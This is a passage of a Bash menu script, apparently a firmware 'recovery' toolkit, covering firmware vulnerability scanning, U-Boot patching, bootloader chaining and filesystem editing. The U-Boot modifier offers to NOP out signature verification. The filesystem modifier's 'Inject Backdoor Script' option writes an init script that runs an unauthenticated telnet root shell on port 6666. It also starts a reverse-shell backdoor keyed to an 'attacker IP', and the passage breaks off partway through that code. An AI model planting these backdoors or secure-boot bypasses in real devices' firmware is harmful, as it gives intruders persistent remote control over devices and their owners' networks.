        strings "$firmware_file" | grep -Ei '(openssl.*0\.|openssh.*[0-6]\.|busybox.*1\.1[0-9]\.|dropbear.*201[0-5])' > "$cve_file" 2>/dev/null || true

        local cve_count=$(wc -l < "$cve_file" 2>/dev/null || echo 0)

        if [ "$cve_count" -gt 0 ]; then
            echo "  WARNING: Found $cve_count potentially outdated components:"
            cat "$cve_file" | sed 's/^/    /'
            echo "  → $cve_file"
            echo "  NOTE: Verify versions and check CVE databases"
        else
            echo "  INFO: No obvious outdated component signatures found"
        fi
    fi

    echo
    echo "========================================="
    echo "Vulnerability Scan Complete!"
    echo "========================================="
    echo "Results saved to: $vuln_dir"
    echo
    echo "SUMMARY OF FINDINGS:"
    echo "  - Review all files in $vuln_dir"
    echo "  - Pay special attention to private keys and hardcoded credentials"
    echo "  - Verify any weak crypto usage"
    echo "  - Check for unsafe functions in security-critical code"
    echo

    log_message "INFO" "Vulnerability scan completed: $vuln_dir"

    read -r -p "Press Enter to continue..."
}

menu_firmware_analysis_suite() {
    while true; do
        print_header
        echo "--- Advanced Firmware Analysis Suite ---"
        echo
        echo "  1) Automated Firmware Teardown"
        echo "     (Comprehensive analysis: entropy, strings, functions, architecture)"
        echo
        echo "  2) Binary Firmware Differ"
        echo "     (Compare two firmware versions for changes)"
        echo
        echo "  3) Vulnerability Scanner"
        echo "     (Scan for hardcoded credentials, weak crypto, dangerous functions)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) firmware_automated_teardown ;;
            2) firmware_binary_diff ;;
            3) firmware_vulnerability_scan ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Advanced Firmware Analysis Suite ---

# --- Bootloader Development Kit ---

bootloader_uboot_modifier() {
    print_header
    echo "=== U-Boot Bootloader Modifier ==="
    echo
    echo "Modify U-Boot bootloader images for custom configurations:"
    echo "  - Patch environment variables"
    echo "  - Modify boot commands"
    echo "  - Change boot delays"
    echo "  - Update network settings"
    echo "  - Disable signature verification"
    echo

    read -r -p "Enter path to U-Boot image: " uboot_file

    if [ ! -f "$uboot_file" ]; then
        echo "ERROR: U-Boot file not found: $uboot_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local modified_file="${uboot_file}.modified"
    cp "$uboot_file" "$modified_file"

    log_message "INFO" "Starting U-Boot modification: $uboot_file"

    while true; do
        print_header
        echo "=== U-Boot Modifier - $(basename "$uboot_file") ==="
        echo
        echo "Modified file: $modified_file"
        echo
        echo "  1) Change Boot Delay"
        echo "  2) Modify Boot Command (bootcmd)"
        echo "  3) Patch Environment Variable"
        echo "  4) Disable Signature Verification (NOP injection)"
        echo "  5) Change Network Settings (IP/Server)"
        echo "  6) Search for Strings in U-Boot"
        echo "  7) View U-Boot Header Info"
        echo "  8) Save and Exit"
        echo "  b) Discard and Exit"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1)
                echo
                echo "--- Change Boot Delay ---"
                echo "Current bootdelay strings in image:"
                strings "$modified_file" | grep -i 'bootdelay' | head -5
                echo
                read -r -p "Enter new boot delay (seconds, e.g., 0 for instant boot): " new_delay

                # Find and replace bootdelay= pattern
                if command -v sed &> /dev/null; then
                    # This is a simplified approach - in reality U-Boot env is more complex
                    echo "Searching for bootdelay references..."

                    # Create a hex pattern for bootdelay=X
                    local search_pattern="bootdelay="
                    local offsets=$(strings -t d "$modified_file" | grep 'bootdelay=' | awk '{print $1}')

                    if [ -n "$offsets" ]; then
                        echo "Found bootdelay at offsets: $offsets"
                        echo "NOTE: Manual hex editing recommended for precise modification"
                        echo "You can use: xxd -s <offset> $modified_file to verify"
                    else
                        echo "No bootdelay string found in binary"
                    fi
                fi
                read -r -p "Press Enter to continue..."
                ;;
            2)
                echo
                echo "--- Modify Boot Command ---"
                echo "Common boot commands found:"
                strings "$modified_file" | grep -Ei '(bootcmd|boot|run)' | head -10
                echo
                read -r -p "Enter search string to replace: " search_str
                read -r -p "Enter replacement string (same length or shorter): " replace_str

                if command -v xxd &> /dev/null; then
                    # Find offset of string
                    local offset=$(strings -t d "$modified_file" | grep -F "$search_str" | head -1 | awk '{print $1}')

                    if [ -n "$offset" ]; then
                        echo "Found at offset: $offset (0x$(printf '%x' $offset))"

                        # Pad replacement string if needed
                        local search_len=${#search_str}
                        local replace_len=${#replace_str}

                        if [ $replace_len -le $search_len ]; then
                            # Pad with nulls
                            local padded_replace="$replace_str"
                            while [ ${#padded_replace} -lt $search_len ]; do
                                padded_replace="${padded_replace}\x00"
                            done

                            echo "Applying patch..."
                            printf "%s" "$replace_str" | dd of="$modified_file" bs=1 seek="$offset" conv=notrunc 2>/dev/null

                            # Null-pad the rest
                            local pad_len=$((search_len - replace_len))
                            if [ $pad_len -gt 0 ]; then
                                dd if=/dev/zero of="$modified_file" bs=1 seek=$((offset + replace_len)) count=$pad_len conv=notrunc 2>/dev/null
                            fi

                            echo "SUCCESS: Patched bootcmd"
                            log_message "INFO" "Modified U-Boot bootcmd: $search_str -> $replace_str"
                        else
                            echo "ERROR: Replacement string too long!"
                        fi
                    else
                        echo "ERROR: String not found in image"
                    fi
                fi
                read -r -p "Press Enter to continue..."
                ;;
            3)
                echo
                echo "--- Patch Environment Variable ---"
                echo "Environment variables found:"
                strings "$modified_file" | grep '=' | head -20
                echo
                read -r -p "Enter variable name (e.g., serverip): " var_name
                read -r -p "Enter new value: " var_value

                local search_pattern="${var_name}="
                local replacement="${var_name}=${var_value}"

                echo "Searching for ${search_pattern}..."
                local offset=$(strings -t d "$modified_file" | grep -F "$search_pattern" | head -1 | awk '{print $1}')

                if [ -n "$offset" ]; then
                    echo "Found at offset: $offset"

                    # Find the full current value
                    local current_value=$(strings "$modified_file" | grep "^${search_pattern}" | head -1)
                    local current_len=${#current_value}
                    local new_len=${#replacement}

                    if [ $new_len -le $current_len ]; then
                        printf "%s" "$replacement" | dd of="$modified_file" bs=1 seek="$offset" conv=notrunc 2>/dev/null

                        # Null-pad
                        local pad_len=$((current_len - new_len))
                        if [ $pad_len -gt 0 ]; then
                            dd if=/dev/zero of="$modified_file" bs=1 seek=$((offset + new_len)) count=$pad_len conv=notrunc 2>/dev/null
                        fi

                        echo "SUCCESS: Modified $var_name"
                        log_message "INFO" "Modified U-Boot env var: $var_name=$var_value"
                    else
                        echo "ERROR: New value too long (max: $current_len chars)"
                    fi
                else
                    echo "ERROR: Variable $var_name not found"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            4)
                echo
                echo "--- Disable Signature Verification ---"
                echo "WARNING: This will NOP out signature check functions"
                echo "This may permanently modify bootloader security!"
                echo
                read -r -p "Enter function name to NOP (e.g., verify_signature): " func_name

                echo "Searching for $func_name..."
                local offset=$(strings -t d "$modified_file" | grep -F "$func_name" | head -1 | awk '{print $1}')

                if [ -n "$offset" ]; then
                    echo "Found reference at offset: $offset"
                    echo "NOTE: This only NOPs the string reference, not the function code"
                    echo "For ARM: Use 0x00 0x00 0xA0 0xE1 (NOP)"
                    echo "For MIPS: Use 0x00 0x00 0x00 0x00 (NOP)"
                    echo
                    read -r -p "Enter NOP byte pattern (hex, e.g., 0000A0E1 for ARM): " nop_pattern
                    read -r -p "Enter number of bytes to NOP: " nop_count

                    # Convert hex pattern to binary
                    echo "$nop_pattern" | xxd -r -p | dd of="$modified_file" bs=1 seek="$offset" count="$nop_count" conv=notrunc 2>/dev/null

                    echo "SUCCESS: Applied NOP patch"
                    log_message "INFO" "NOPped U-Boot function: $func_name at offset $offset"
                else
                    echo "ERROR: Function reference not found"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            5)
                echo
                echo "--- Change Network Settings ---"
                echo "Current network-related strings:"
                strings "$modified_file" | grep -Ei '(ipaddr|serverip|netmask|gateway)' | head -10
                echo
                echo "  1) Change IP Address (ipaddr)"
                echo "  2) Change Server IP (serverip)"
                echo "  3) Change Netmask"
                echo "  4) Change Gateway"
                echo
                read -r -p "Choose setting to modify: " net_choice

                local var_to_modify=""
                case "$net_choice" in
                    1) var_to_modify="ipaddr" ;;
                    2) var_to_modify="serverip" ;;
                    3) var_to_modify="netmask" ;;
                    4) var_to_modify="gateway" ;;
                    *) echo "Invalid choice" && sleep 1 && continue ;;
                esac

                read -r -p "Enter new $var_to_modify value: " new_ip

                local search_pattern="${var_to_modify}="
                local offset=$(strings -t d "$modified_file" | grep -F "$search_pattern" | head -1 | awk '{print $1}')

                if [ -n "$offset" ]; then
                    local current_value=$(strings "$modified_file" | grep "^${search_pattern}" | head -1)
                    local current_len=${#current_value}
                    local replacement="${var_to_modify}=${new_ip}"
                    local new_len=${#replacement}

                    if [ $new_len -le $current_len ]; then
                        printf "%s" "$replacement" | dd of="$modified_file" bs=1 seek="$offset" conv=notrunc 2>/dev/null

                        # Null-pad
                        local pad_len=$((current_len - new_len))
                        if [ $pad_len -gt 0 ]; then
                            dd if=/dev/zero of="$modified_file" bs=1 seek=$((offset + new_len)) count=$pad_len conv=notrunc 2>/dev/null
                        fi

                        echo "SUCCESS: Modified $var_to_modify to $new_ip"
                        log_message "INFO" "Modified U-Boot network: $var_to_modify=$new_ip"
                    else
                        echo "ERROR: New value too long"
                    fi
                else
                    echo "ERROR: Variable $var_to_modify not found"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            6)
                echo
                echo "--- Search Strings in U-Boot ---"
                read -r -p "Enter search pattern: " search_term
                echo
                echo "Results:"
                strings -t d "$modified_file" | grep -i "$search_term"
                echo
                read -r -p "Press Enter to continue..."
                ;;
            7)
                echo
                echo "--- U-Boot Header Info ---"
                if command -v file &> /dev/null; then
                    file "$modified_file"
                fi
                echo
                echo "File size: $(stat -c%s "$modified_file" 2>/dev/null || stat -f%z "$modified_file" 2>/dev/null) bytes"
                echo
                echo "Potential U-Boot version:"
                strings "$modified_file" | grep -Ei '(U-Boot|version|build)' | head -10
                echo
                read -r -p "Press Enter to continue..."
                ;;
            8)
                echo
                echo "Modified U-Boot saved to: $modified_file"
                log_message "INFO" "U-Boot modification completed: $modified_file"
                read -r -p "Press Enter to continue..."
                return 0
                ;;
            b)
                echo "Discarding changes..."
                rm -f "$modified_file"
                return 0
                ;;
            *)
                echo "Invalid option."
                sleep 1
                ;;
        esac
    done
}

bootloader_chain_builder() {
    print_header
    echo "=== Bootloader Chain Builder ==="
    echo
    echo "Create multi-stage bootloader configurations:"
    echo "  - Build bootloader chains (Stage1 -> Stage2 -> Kernel)"
    echo "  - Configure load addresses and entry points"
    echo "  - Generate boot scripts"
    echo "  - Create combined bootloader images"
    echo

    local chain_dir="${SESSION_DIR}/bootloader_chain_$(date +%s)"
    mkdir -p "$chain_dir"

    log_message "INFO" "Starting bootloader chain builder: $chain_dir"

    while true; do
        print_header
        echo "=== Bootloader Chain Builder ==="
        echo
        echo "Chain directory: $chain_dir"
        echo
        echo "  1) Define Stage 1 Bootloader (Primary)"
        echo "  2) Define Stage 2 Bootloader (Secondary)"
        echo "  3) Define Kernel/Firmware"
        echo "  4) Set Load Addresses & Entry Points"
        echo "  5) Generate U-Boot Script"
        echo "  6) Create Combined Image"
        echo "  7) View Current Configuration"
        echo "  8) Export Configuration"
        echo "  b) Back"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1)
                echo
                echo "--- Define Stage 1 Bootloader ---"
                read -r -p "Enter path to Stage 1 bootloader: " stage1_file

                if [ ! -f "$stage1_file" ]; then
                    echo "ERROR: File not found: $stage1_file"
                else
                    cp "$stage1_file" "$chain_dir/stage1.bin"
                    local stage1_size=$(stat -c%s "$chain_dir/stage1.bin" 2>/dev/null || stat -f%z "$chain_dir/stage1.bin" 2>/dev/null)
                    echo "stage1_file=$stage1_file" > "$chain_dir/config.txt"
                    echo "stage1_size=$stage1_size" >> "$chain_dir/config.txt"
                    echo "SUCCESS: Stage 1 configured ($stage1_size bytes)"
                    log_message "INFO" "Stage 1 bootloader set: $stage1_file"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            2)
                echo
                echo "--- Define Stage 2 Bootloader ---"
                read -r -p "Enter path to Stage 2 bootloader (U-Boot, etc.): " stage2_file

                if [ ! -f "$stage2_file" ]; then
                    echo "ERROR: File not found: $stage2_file"
                else
                    cp "$stage2_file" "$chain_dir/stage2.bin"
                    local stage2_size=$(stat -c%s "$chain_dir/stage2.bin" 2>/dev/null || stat -f%z "$chain_dir/stage2.bin" 2>/dev/null)
                    echo "stage2_file=$stage2_file" >> "$chain_dir/config.txt"
                    echo "stage2_size=$stage2_size" >> "$chain_dir/config.txt"
                    echo "SUCCESS: Stage 2 configured ($stage2_size bytes)"
                    log_message "INFO" "Stage 2 bootloader set: $stage2_file"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            3)
                echo
                echo "--- Define Kernel/Firmware ---"
                read -r -p "Enter path to kernel/firmware: " kernel_file

                if [ ! -f "$kernel_file" ]; then
                    echo "ERROR: File not found: $kernel_file"
                else
                    cp "$kernel_file" "$chain_dir/kernel.bin"
                    local kernel_size=$(stat -c%s "$chain_dir/kernel.bin" 2>/dev/null || stat -f%z "$chain_dir/kernel.bin" 2>/dev/null)
                    echo "kernel_file=$kernel_file" >> "$chain_dir/config.txt"
                    echo "kernel_size=$kernel_size" >> "$chain_dir/config.txt"
                    echo "SUCCESS: Kernel configured ($kernel_size bytes)"
                    log_message "INFO" "Kernel set: $kernel_file"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            4)
                echo
                echo "--- Set Load Addresses & Entry Points ---"
                echo "Note: Addresses should be in hex format (e.g., 0x80000000)"
                echo
                read -r -p "Stage 1 load address (hex): " stage1_load
                read -r -p "Stage 2 load address (hex): " stage2_load
                read -r -p "Kernel load address (hex): " kernel_load
                read -r -p "Kernel entry point (hex): " kernel_entry

                echo "stage1_load_addr=$stage1_load" >> "$chain_dir/config.txt"
                echo "stage2_load_addr=$stage2_load" >> "$chain_dir/config.txt"
                echo "kernel_load_addr=$kernel_load" >> "$chain_dir/config.txt"
                echo "kernel_entry_point=$kernel_entry" >> "$chain_dir/config.txt"

                echo "SUCCESS: Addresses configured"
                log_message "INFO" "Bootloader addresses configured"
                read -r -p "Press Enter to continue..."
                ;;
            5)
                echo
                echo "--- Generate U-Boot Script ---"

                if [ ! -f "$chain_dir/config.txt" ]; then
                    echo "ERROR: No configuration found. Define stages first."
                    read -r -p "Press Enter to continue..."
                    continue
                fi

                # Source the config
                source "$chain_dir/config.txt" 2>/dev/null || true

                local script_file="$chain_dir/boot.scr.txt"

                cat > "$script_file" <<EOF
# Auto-generated U-Boot boot script
# Generated by Cisco Recovery Tool - Bootloader Chain Builder
# $(date)

echo "=== Multi-Stage Boot Sequence ==="

# Stage 1: Load initial bootloader
echo "Loading Stage 1 Bootloader..."
# Assuming Stage 1 is already in place (ROM/Flash)

# Stage 2: Load U-Boot or secondary bootloader
echo "Loading Stage 2 Bootloader..."
EOF

                if [ -n "$stage2_load_addr" ]; then
                    echo "fatload mmc 0:1 $stage2_load_addr stage2.bin" >> "$script_file"
                    echo "go $stage2_load_addr" >> "$script_file"
                fi

                cat >> "$script_file" <<EOF

# Stage 3: Load kernel
echo "Loading Kernel..."
EOF

                if [ -n "$kernel_load_addr" ] && [ -n "$kernel_entry_point" ]; then
                    echo "fatload mmc 0:1 $kernel_load_addr kernel.bin" >> "$script_file"
                    echo "bootm $kernel_entry_point" >> "$script_file"
                fi

                echo "" >> "$script_file"
                echo "echo \"Boot sequence complete\"" >> "$script_file"

                echo "SUCCESS: Boot script generated at $script_file"
                echo
                echo "Script contents:"
                cat "$script_file"
                echo

                # Compile script if mkimage is available
                if command -v mkimage &> /dev/null; then
                    echo "Compiling U-Boot script..."
                    mkimage -A arm -T script -C none -n "Boot Script" -d "$script_file" "$chain_dir/boot.scr" 2>&1
                    if [ $? -eq 0 ]; then
                        echo "SUCCESS: Compiled script: $chain_dir/boot.scr"
                    fi
                else
                    echo "NOTE: mkimage not available - script not compiled"
                    echo "Install u-boot-tools to compile the script"
                fi

                log_message "INFO" "Generated boot script: $script_file"
                read -r -p "Press Enter to continue..."
                ;;
            6)
                echo
                echo "--- Create Combined Image ---"

                if [ ! -f "$chain_dir/stage1.bin" ]; then
                    echo "ERROR: Stage 1 not defined"
                    read -r -p "Press Enter to continue..."
                    continue
                fi

                local combined_file="$chain_dir/combined_bootloader.bin"

                echo "Creating combined bootloader image..."

                # Start with stage1
                cat "$chain_dir/stage1.bin" > "$combined_file"

                # Pad to 64KB boundary if stage2 exists
                if [ -f "$chain_dir/stage2.bin" ]; then
                    local current_size=$(stat -c%s "$combined_file" 2>/dev/null || stat -f%z "$combined_file" 2>/dev/null)
                    local pad_to=65536  # 64KB
                    local pad_bytes=$((pad_to - current_size))

                    if [ $pad_bytes -gt 0 ]; then
                        echo "Padding stage 1 to ${pad_to} bytes..."
                        dd if=/dev/zero bs=1 count=$pad_bytes >> "$combined_file" 2>/dev/null
                    fi

                    # Append stage2
                    echo "Appending stage 2..."
                    cat "$chain_dir/stage2.bin" >> "$combined_file"
                fi

                # Pad to 1MB boundary if kernel exists
                if [ -f "$chain_dir/kernel.bin" ]; then
                    local current_size=$(stat -c%s "$combined_file" 2>/dev/null || stat -f%z "$combined_file" 2>/dev/null)
                    local pad_to=1048576  # 1MB
                    local pad_bytes=$((pad_to - current_size))

                    if [ $pad_bytes -gt 0 ]; then
                        echo "Padding bootloaders to ${pad_to} bytes..."
                        dd if=/dev/zero bs=1 count=$pad_bytes >> "$combined_file" 2>/dev/null
                    fi

                    # Append kernel
                    echo "Appending kernel..."
                    cat "$chain_dir/kernel.bin" >> "$combined_file"
                fi

                local final_size=$(stat -c%s "$combined_file" 2>/dev/null || stat -f%z "$combined_file" 2>/dev/null)

                echo
                echo "========================================="
                echo "SUCCESS: Combined image created!"
                echo "========================================="
                echo "File: $combined_file"
                echo "Size: $final_size bytes ($((final_size / 1024)) KB)"
                echo
                echo "This image can be flashed via JTAG or written to storage device"

                log_message "INFO" "Created combined bootloader image: $combined_file ($final_size bytes)"
                read -r -p "Press Enter to continue..."
                ;;
            7)
                echo
                echo "--- Current Configuration ---"
                if [ -f "$chain_dir/config.txt" ]; then
                    cat "$chain_dir/config.txt"
                else
                    echo "No configuration found"
                fi
                echo
                echo "Files in chain directory:"
                ls -lh "$chain_dir/" 2>/dev/null || echo "Empty"
                echo
                read -r -p "Press Enter to continue..."
                ;;
            8)
                echo
                echo "--- Export Configuration ---"
                read -r -p "Enter export directory path: " export_dir

                if [ ! -d "$export_dir" ]; then
                    mkdir -p "$export_dir" 2>/dev/null
                fi

                if [ -d "$export_dir" ]; then
                    cp -r "$chain_dir"/* "$export_dir/" 2>/dev/null
                    echo "SUCCESS: Configuration exported to $export_dir"
                    log_message "INFO" "Exported bootloader chain to: $export_dir"
                else
                    echo "ERROR: Cannot create export directory"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            b)
                echo "Bootloader chain configuration saved in: $chain_dir"
                return 0
                ;;
            *)
                echo "Invalid option."
                sleep 1
                ;;
        esac
    done
}

menu_bootloader_devkit() {
    while true; do
        print_header
        echo "--- Bootloader Development Kit ---"
        echo
        echo "  1) U-Boot Modifier"
        echo "     (Patch U-Boot environment, boot commands, network settings)"
        echo
        echo "  2) Bootloader Chain Builder"
        echo "     (Create multi-stage bootloader configurations)"
        echo
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) bootloader_uboot_modifier ;;
            2) bootloader_chain_builder ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Bootloader Development Kit ---

# --- Firmware Filesystem Tools ---

firmware_fs_extract() {
    print_header
    echo "=== Firmware Filesystem Extractor ==="
    echo
    echo "Extract and analyze firmware filesystems:"
    echo "  - Automatic filesystem detection"
    echo "  - Support for squashfs, cramfs, jffs2, yaffs2"
    echo "  - Full directory tree extraction"
    echo "  - Automatic decompression"
    echo

    read -r -p "Enter path to firmware file: " firmware_file

    if [ ! -f "$firmware_file" ]; then
        echo "ERROR: File not found: $firmware_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local extract_dir="${SESSION_DIR}/extracted_$(basename "$firmware_file")_$(date +%s)"
    mkdir -p "$extract_dir"

    log_message "INFO" "Starting filesystem extraction: $firmware_file"

    echo
    echo ">>> Step 1/4: Scanning for Filesystems"
    echo "---------------------------------------"
    if command -v binwalk &> /dev/null; then
        echo "Scanning firmware for embedded filesystems..."
        binwalk "$firmware_file" | tee "$extract_dir/scan_results.txt"

        local fs_count=$(grep -Ei '(squashfs|cramfs|jffs2|yaffs2|romfs|ext[234])' "$extract_dir/scan_results.txt" | wc -l)
        echo
        echo "Found $fs_count filesystem(s)"
    else
        echo "ERROR: binwalk is required for filesystem extraction"
        echo "Install with: sudo apt-get install binwalk"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    echo
    echo ">>> Step 2/4: Extracting Filesystems"
    echo "-------------------------------------"
    echo "Extracting to: $extract_dir"
    echo

    cd "$extract_dir"
    binwalk -e "$firmware_file" 2>&1 | tee extraction.log

    echo
    echo ">>> Step 3/4: Analyzing Extracted Files"
    echo "----------------------------------------"

    # Find the extracted directory
    local extracted_root=$(find "$extract_dir" -type d -name "_${firmware_file##*/}.extracted" | head -1)

    if [ -z "$extracted_root" ]; then
        extracted_root=$(find "$extract_dir" -maxdepth 1 -type d ! -name "$(basename "$extract_dir")" | head -1)
    fi

    if [ -d "$extracted_root" ]; then
        echo "Extracted filesystem root: $extracted_root"
        echo
        echo "Directory structure (top level):"
        ls -lah "$extracted_root" 2>/dev/null | head -30

        echo
        echo "Total files extracted:"
        find "$extracted_root" -type f | wc -l

        echo
        echo "File types breakdown:"
        find "$extracted_root" -type f -exec file {} \; 2>/dev/null | cut -d: -f2 | sort | uniq -c | sort -rn | head -15
    else
        echo "WARNING: Could not locate extracted filesystem root"
    fi

    echo
    echo ">>> Step 4/4: Security Quick Scan"
    echo "----------------------------------"
    if [ -d "$extracted_root" ]; then
        echo "Searching for interesting files..."

        # SUID binaries
        local suid_files=$(find "$extracted_root" -type f -perm -4000 2>/dev/null | wc -l)
        echo "  SUID binaries: $suid_files"
        if [ $suid_files -gt 0 ]; then
            find "$extracted_root" -type f -perm -4000 2>/dev/null | head -10 | sed 's/^/    /'
        fi

        # Configuration files
        echo "  Configuration files (.conf, .cfg, .xml, .json):"
        find "$extracted_root" -type f \( -name "*.conf" -o -name "*.cfg" -o -name "*.xml" -o -name "*.json" \) 2>/dev/null | wc -l

        # Scripts
        echo "  Shell scripts:"
        find "$extracted_root" -type f -name "*.sh" 2>/dev/null | wc -l

        # Credentials search
        echo
        echo "  Quick credential search (top 5 results):"
        grep -r -Ei '(password|passwd|secret|key)' "$extracted_root" 2>/dev/null | head -5 | cut -c1-100 | sed 's/^/    /'
    fi

    echo
    echo "========================================="
    echo "Extraction Complete!"
    echo "========================================="
    echo "Extraction directory: $extract_dir"
    if [ -d "$extracted_root" ]; then
        echo "Filesystem root: $extracted_root"
    fi
    echo

    # Save extraction info
    cat > "$extract_dir/EXTRACTION_INFO.txt" <<EOF
Firmware File: $firmware_file
Extraction Date: $(date)
Extraction Directory: $extract_dir
Filesystem Root: $extracted_root

To browse the filesystem:
  cd "$extracted_root"

To modify files:
  Use the Firmware Filesystem Modifier menu option

To repackage:
  Use the Firmware Filesystem Repackager menu option
EOF

    log_message "INFO" "Filesystem extraction completed: $extract_dir"

    read -r -p "Press Enter to continue..."
}

firmware_fs_modify() {
    print_header
    echo "=== Firmware Filesystem Modifier ==="
    echo
    echo "Modify files within an extracted firmware filesystem:"
    echo "  - Edit configuration files"
    echo "  - Replace binaries"
    echo "  - Add/remove files"
    echo "  - Modify scripts"
    echo

    read -r -p "Enter path to extracted filesystem root: " fs_root

    if [ ! -d "$fs_root" ]; then
        echo "ERROR: Directory not found: $fs_root"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    log_message "INFO" "Starting filesystem modification: $fs_root"

    while true; do
        print_header
        echo "=== Filesystem Modifier - $(basename "$fs_root") ==="
        echo
        echo "Filesystem: $fs_root"
        echo
        echo "  1) Browse Filesystem"
        echo "  2) Edit File (Text Editor)"
        echo "  3) Replace Binary/File"
        echo "  4) Add New File"
        echo "  5) Delete File"
        echo "  6) Modify Permissions/Ownership"
        echo "  7) Search for Files"
        echo "  8) Inject Backdoor Script"
        echo "  9) Modify Init Scripts"
        echo "  b) Back"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1)
                echo
                echo "--- Browse Filesystem ---"
                echo "Current directory: $fs_root"
                echo
                ls -lah "$fs_root" 2>/dev/null
                echo
                read -r -p "Enter subdirectory to browse (or press Enter to skip): " subdir
                if [ -n "$subdir" ] && [ -d "$fs_root/$subdir" ]; then
                    ls -lah "$fs_root/$subdir" 2>/dev/null
                fi
                echo
                read -r -p "Press Enter to continue..."
                ;;
            2)
                echo
                echo "--- Edit File ---"
                read -r -p "Enter path to file (relative to $fs_root): " file_path

                local full_path="$fs_root/$file_path"

                if [ ! -f "$full_path" ]; then
                    echo "ERROR: File not found: $full_path"
                else
                    # Backup original
                    cp "$full_path" "${full_path}.backup"
                    echo "Backup created: ${full_path}.backup"

                    # Try to use available editors
                    if command -v nano &> /dev/null; then
                        nano "$full_path"
                    elif command -v vi &> /dev/null; then
                        vi "$full_path"
                    else
                        echo "No text editor available (nano/vi)"
                        echo "File contents:"
                        cat "$full_path"
                    fi

                    log_message "INFO" "Modified file: $full_path"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            3)
                echo
                echo "--- Replace Binary/File ---"
                read -r -p "Enter path to file to replace (relative to $fs_root): " target_file
                read -r -p "Enter path to replacement file: " source_file

                local target_path="$fs_root/$target_file"

                if [ ! -f "$source_file" ]; then
                    echo "ERROR: Source file not found: $source_file"
                elif [ ! -f "$target_path" ]; then
                    echo "ERROR: Target file not found: $target_path"
                else
                    # Backup original
                    cp "$target_path" "${target_path}.backup"
                    echo "Backup created: ${target_path}.backup"

                    # Replace file
                    cp "$source_file" "$target_path"
                    echo "SUCCESS: File replaced"

                    log_message "INFO" "Replaced file: $target_path with $source_file"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            4)
                echo
                echo "--- Add New File ---"
                read -r -p "Enter source file path: " source_file
                read -r -p "Enter destination path (relative to $fs_root): " dest_path

                local full_dest="$fs_root/$dest_path"

                if [ ! -f "$source_file" ]; then
                    echo "ERROR: Source file not found: $source_file"
                else
                    # Create directory if needed
                    mkdir -p "$(dirname "$full_dest")"

                    cp "$source_file" "$full_dest"
                    echo "SUCCESS: File added at $full_dest"

                    log_message "INFO" "Added file: $full_dest"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            5)
                echo
                echo "--- Delete File ---"
                echo "WARNING: This will permanently delete the file!"
                read -r -p "Enter path to file (relative to $fs_root): " file_path

                local full_path="$fs_root/$file_path"

                if [ ! -f "$full_path" ]; then
                    echo "ERROR: File not found: $full_path"
                else
                    read -r -p "Are you sure you want to delete $file_path? (yes/no): " confirm
                    if [ "$confirm" = "yes" ]; then
                        rm "$full_path"
                        echo "SUCCESS: File deleted"
                        log_message "INFO" "Deleted file: $full_path"
                    else
                        echo "Cancelled"
                    fi
                fi
                read -r -p "Press Enter to continue..."
                ;;
            6)
                echo
                echo "--- Modify Permissions/Ownership ---"
                read -r -p "Enter path to file (relative to $fs_root): " file_path

                local full_path="$fs_root/$file_path"

                if [ ! -e "$full_path" ]; then
                    echo "ERROR: File not found: $full_path"
                else
                    echo "Current permissions:"
                    ls -l "$full_path"
                    echo
                    echo "  1) Make executable (+x)"
                    echo "  2) Set SUID bit (u+s)"
                    echo "  3) Custom chmod"
                    echo "  4) Custom chown"
                    echo
                    read -r -p "Choose option: " perm_choice

                    case "$perm_choice" in
                        1)
                            chmod +x "$full_path"
                            echo "SUCCESS: Made executable"
                            ;;
                        2)
                            chmod u+s "$full_path"
                            echo "SUCCESS: SUID bit set"
                            ;;
                        3)
                            read -r -p "Enter chmod value (e.g., 755): " chmod_val
                            chmod "$chmod_val" "$full_path"
                            echo "SUCCESS: Permissions set to $chmod_val"
                            ;;
                        4)
                            read -r -p "Enter owner:group (e.g., root:root): " own_val
                            chown "$own_val" "$full_path" 2>/dev/null || echo "Note: May require root privileges"
                            echo "SUCCESS: Ownership set to $own_val"
                            ;;
                    esac

                    echo "New permissions:"
                    ls -l "$full_path"

                    log_message "INFO" "Modified permissions: $full_path"
                fi
                read -r -p "Press Enter to continue..."
                ;;
            7)
                echo
                echo "--- Search for Files ---"
                read -r -p "Enter filename pattern (e.g., *.conf): " pattern
                echo
                echo "Searching for: $pattern"
                find "$fs_root" -name "$pattern" -type f 2>/dev/null
                echo
                read -r -p "Press Enter to continue..."
                ;;
            8)
                echo
                echo "--- Inject Backdoor Script ---"
                echo "WARNING: This creates a backdoor for authorized testing only!"
                echo
                echo "  1) Telnet backdoor (port 6666)"
                echo "  2) Reverse shell backdoor"
                echo "  3) SSH key injection"
                echo "  4) Custom script"
                echo
                read -r -p "Choose backdoor type: " backdoor_choice

                local backdoor_script="$fs_root/etc/init.d/backdoor"

                case "$backdoor_choice" in
                    1)
                        mkdir -p "$fs_root/etc/init.d"
                        cat > "$backdoor_script" <<'BACKDOOR_EOF'
#!/bin/sh
# Telnet backdoor - authorized testing only
/usr/sbin/telnetd -p 6666 -l /bin/sh
BACKDOOR_EOF
                        chmod +x "$backdoor_script"
                        echo "SUCCESS: Telnet backdoor created at $backdoor_script"
                        echo "         Listens on port 6666"
                        ;;
                    2)
                        read -r -p "Enter attacker IP: " attacker_ip
                        read -r -p "Enter attacker port: " attacker_port
                        mkdir -p "$fs_root/etc/init.d"
                        cat > "$backdoor_script" <<BACKDOOR_EOF
#!/bin/sh
